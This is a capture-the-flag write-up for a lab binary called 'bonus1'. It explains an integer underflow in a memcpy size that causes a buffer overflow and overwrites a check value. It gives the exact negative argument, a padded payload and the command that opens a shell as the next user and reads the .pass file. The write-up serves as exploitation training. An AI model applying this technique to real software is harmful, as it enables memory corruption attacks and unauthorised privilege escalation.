# Bonus 1

## Initial Context

- One file: `bonus1`

## Solving the Challenge

The program expects a number bellow 10, and a buffer overflow.
`n` bytes will be copied from the second argument to a buffer.
If the buffer overflows, the number value is changed and must match `1464814662` to get access to a shell.

Since we need to write `44 bytes` and the number can only goes up to `9`, we have to overflow a negative value as the number is **multiplied by `4`** for the `memcpy`.

Since the size argument of `memcpy` is a `size_t` which is `unsigned`, we need to take that into account.

```c
UINT_MAX / 4 = 1073741823
(or 4294967295 / 4 = 1073741823.75 to be exact)
```

`1073741823`, negated and multiplied by 4 gives back `4` after underflow.
By adding (or subtracting since we are negative) `10` to the operation, we get our `44`.

```c
-((UINT_MAX / 4) - 10) = -1073741813
```

A small demo code is [available here](./Ressources/test.c).

To craft the second argument, its pretty simple:

```python
# padding of 40 for original buffer size
"A" * 40

# 1464814662 in LE
+ "\x46\x4c\x4f\x57"
```

We can send it to the vulnerable program:

```bash
$ ./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
<flag>
```
